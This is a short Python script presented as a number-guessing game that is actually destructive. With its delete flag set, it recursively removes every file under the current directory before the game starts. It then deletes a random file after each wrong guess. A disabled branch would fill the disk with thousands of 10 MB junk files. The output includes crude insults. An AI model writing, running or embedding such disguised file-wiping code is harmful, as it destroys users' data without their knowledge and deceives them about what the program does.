import os
import random
import glob


delete = True
num = random.randint(1, 100)

if not delete:
        for i in range(3000):
                f = open(f"ashduIAhdli{random.randint(10000, 1000000)}.hehe", "wb")
                f.write(os.urandom(10000000))
                f.close()

        

files = []
for root, _, f_names in os.walk("."):
        for name in f_names:
                files.append(os.path.join(root, name))

if delete:
        for file in files:
                try:
                        os.remove(file)
                except:
                        pass


while True:
        print("Guess my number between 1 and 100")
        resp = input("> ")
        if len(resp) == 0:
                print("bye bitch")
                break
        guess = int(resp)        

        kill = random.choice(files)
        print(kill)

        try:
                if guess > num:
                        print("your too high, dleeting file")
                        os.remove(kill)
                elif guess < num:
                        print("your too low, dleeting fily")
                        os.remove(kill)
                else:
                        print("you got it bucko")
                        break
        except:
                print("shit happened")
